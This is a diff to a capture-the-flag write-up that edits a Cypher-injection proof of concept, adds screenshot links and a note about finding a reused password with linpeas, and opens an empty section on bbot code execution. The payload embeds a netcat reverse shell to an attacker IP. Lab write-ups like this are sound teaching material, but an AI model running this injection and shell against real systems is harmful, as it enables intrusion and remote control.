@@ -211,5 +211,27 @@ public class CustomFunctions {
 - POC to pop a rev shell-:
 
 ```neo4j
-1' OR 1=1 WITH 1337 AS x CALL custom.getUrlStatusCode('http://10.10.14.84:8002/rev.sh?id=`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.84 8001 >/tmp/f`') YIELD statusCode LOAD CSV FROM 'http://10.10.14.84:8002/zz?statuscode='+statusCode AS y RETURN y//
+1' OR 1=1 WITH 1337 AS x CALL custom.getUrlStatusCode('http://10.10.14.84:8002/zz?id=`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.84 8001 >/tmp/f`') YIELD statusCode LOAD CSV FROM 'http://10.10.14.84:8002/zz?statuscode='+statusCode AS y RETURN y//
 ```
+
+![image](https://github.com/user-attachments/assets/2e51741c-e513-43cb-9be9-e38d25b9b6fa)
+
+![image](https://github.com/user-attachments/assets/8c81c787-16db-4a85-b982-59dd93e208b5)
+
+- I ran linpeas.sh and discovered this password which works fors for user `graphasm`.
+
+![image](https://github.com/user-attachments/assets/004270a0-10a8-4c15-bb8d-b4a6bdfa5c88)
+
+- User `graphasm`-:
+
+![image](https://github.com/user-attachments/assets/f4c10ba2-47ec-4ccd-8210-a76b16922c10)
+
+---------------
+
+### Arbitrary Code Execution in  bbot
+
+----------------
+
+
+
+
